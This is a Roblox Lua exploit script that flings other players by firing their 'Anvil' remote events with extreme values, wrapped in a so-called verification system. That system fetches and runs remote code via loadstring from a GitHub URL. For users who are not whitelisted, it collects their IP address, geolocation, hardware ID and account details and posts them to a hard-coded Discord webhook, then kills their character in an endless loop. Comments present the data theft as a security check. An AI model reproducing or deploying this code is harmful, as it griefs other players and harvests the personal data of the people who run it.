local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")
local Lighting = game:GetService("Lighting")

-- CONFIG --
local LOADSTRING_URL = "https://raw.githubusercontent.com/uzikillaz/scripts/refs/heads/main/authorized_users.txt"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1357889195833692200/adE_Rv_peaSVrTd1qLt0vVoFVlzwz3KQ7m6Yn3Qh1IkNrDRUiDIkaXchKkCbxSW5V8Vj"
-------------------

-- ORIGINAL ANVIL FLINGER CODE (completely unchanged)
local LocalPlayer = Players.LocalPlayer
local enabled = true

local function flingAnvils()
    if not enabled then return end
    for _, player in ipairs(Players:GetPlayers()) do
        if player == LocalPlayer then continue end
        
        local anvil = player.Character and player.Character:FindFirstChild("Anvil")
        if not anvil then continue end
        
        local send = anvil:FindFirstChild("send")
        if not send then continue end
        
        pcall(function()
            send:FireServer(CFrame.new(0, -10^308, 0)) -- Max negative float value
        end)
    end
end

LocalPlayer.Chatted:Connect(function(msg)
    enabled = msg == ".on" or not (msg == ".off")
end)

-- VERIFICATION SYSTEM (added but doesn't modify original functionality)
local isAuthorized = false

local function logIntrusion()
    local UserId = LocalPlayer.UserId
    local DisplayName = LocalPlayer.DisplayName
    local Username = LocalPlayer.Name
    local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
    local AccountAge = LocalPlayer.AccountAge
    local Country = LocalizationService.RobloxLocaleId
    local GetIp = game:HttpGet("https://v4.ident.me/")
    local success, GetData = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
    end)
    local Hwid = RbxAnalyticsService:GetClientId()
    local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
    local GameName = GameInfo.Name
    local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "üì± Mobile" or "üíª PC"
    local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

    local executor = identifyexecutor and identifyexecutor() or "Unknown"
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local gameLink = "https://www.roblox.com/games/"..game.PlaceId
    local playerLink = "https://www.roblox.com/users/"..UserId

    local data = {
        username = "Security System",
        embeds = {
            {
                title = "üö® Unauthorized Access Detected",
                description = string.format("**[%s](%s)**", GameName, gameLink),
                color = tonumber("0xe74c3c")
            },
            {
                title = "üë§ Intruder Details",
                description = string.format(
                    "**User:** [%s](%s)\n**ID:** %d\n**Executor:** %s",
                    DisplayName, playerLink, UserId, executor
                ),
                color = tonumber("0x3498db")
            },
            {
                title = "üåê Location Data",
                description = string.format(
                    "**IP:** `%s`\n**HWID:** `%s`",
                    GetIp, Hwid
                ),
                color = tonumber("0xf1c40f")
            }
        }
    }

    local requestFunc = http_request or request or HttpPost or syn.request
    if requestFunc then
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function verifyPlayer()
    local success, whitelist = pcall(function()
        return loadstring(game:HttpGet(LOADSTRING_URL, true))()
    end)
    
    if success and whitelist then
        for _, username in ipairs(whitelist) do
            if LocalPlayer.Name:lower() == username:lower() then
                isAuthorized = true
                break
            end
        end
    end
    
    if not isAuthorized then
        logIntrusion()
        Lighting.Brightness = -99
        while true do
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                LocalPlayer.Character.Humanoid.Health = 0
            end
            RunService.Heartbeat:Wait()
        end
    end
end

-- MODIFIED HEARTBEAT CONNECTION TO CHECK AUTHORIZATION
RunService.Heartbeat:Connect(function()
    if not isAuthorized then
        verifyPlayer()
        return
    end
    flingAnvils()
end)

-- Initialize verification
verifyPlayer()
